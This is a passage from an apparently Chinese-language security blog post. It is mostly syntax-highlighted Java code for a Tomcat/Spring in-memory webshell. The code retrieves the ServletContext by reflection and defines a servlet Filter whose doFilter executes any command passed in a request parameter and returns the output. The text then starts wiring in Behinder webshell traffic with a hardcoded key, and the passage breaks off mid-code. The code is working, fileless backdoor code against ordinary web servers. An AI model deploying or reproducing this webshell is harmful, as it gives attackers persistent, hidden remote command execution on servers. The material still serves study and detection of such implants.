&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ThreadLocal&lt;/span> &lt;span style="color:#111">threadLocal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">threadLocal&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">threadLocal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">servletRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletRequest&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">threadLocal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 证明前半部分成功
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 如果失败则换其他方式
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// spring获取法1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">servletRequest&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.springframework.web.context.request.RequestContextHolder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRequestAttributes&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.springframework.web.context.request.ServletRequestAttributes&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRequest&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">servletRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletRequest&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">servletRequest&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getServletContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// spring获取法2
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.springframework.web.context.ContextLoader&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getCurrentWebApplicationContext&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.springframework.web.context.WebApplicationContext&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getServletContext&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ServletContext&lt;/span> &lt;span style="color:#111">servletContext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletContext&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">servletContext&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DOM&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SerializationHandler&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">handlers&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">TransletException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DOM&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">DTMAxisIterator&lt;/span> &lt;span style="color:#111">iterator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SerializationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">TransletException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">FilterConfig&lt;/span> &lt;span style="color:#111">filterConfig&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">ServletException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletRequest&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ServletResponse&lt;/span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">FilterChain&lt;/span> &lt;span style="color:#111">filterChain&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ServletException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// System.out.println(&amp;#34;TomcatShellInject doFilter..........&amp;#34;);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getParameter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmdParamName&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Process&lt;/span> &lt;span style="color:#111">process&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">BufferedReader&lt;/span> &lt;span style="color:#111">bufferedReader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">BufferedReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">process&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">StringBuilder&lt;/span> &lt;span style="color:#111">stringBuilder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">line&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bufferedReader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">stringBuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">line&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;\n&amp;#39;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOutputStream&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stringBuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOutputStream&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOutputStream&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">filterChain&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">servletRequest&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">destroy&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="接入冰蝎">接入冰蝎&lt;/h3>
&lt;p>只需要在我们重写的&lt;code>doFilter&lt;/code>部分多加一个if来适配冰蝎流量的逻辑即可接入冰蝎，代码部分详细分析参见Y4er师傅的&lt;a href="https://y4er.com/post/java-deserialization-inject-behinder-memshell-note/">Java反序列化注入冰蝎内存马相关踩坑笔记&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// omit
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HttpServletRequest&lt;/span> &lt;span style="color:#111">request&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HttpServletRequest&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HttpServletResponse&lt;/span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HttpServletResponse&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HttpSession&lt;/span> &lt;span style="color:#111">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSession&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// create pageContext
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">HashMap&lt;/span> &lt;span style="color:#111">pageContext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pageContext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;request&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pageContext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;response&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pageContext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;session&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 这里的判断条件可自行修改
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getHeader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Referer&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://www.baidu.com/&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;e45e329feb5d925b&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// default: pass=beyond, k=md5(pass)[:16]
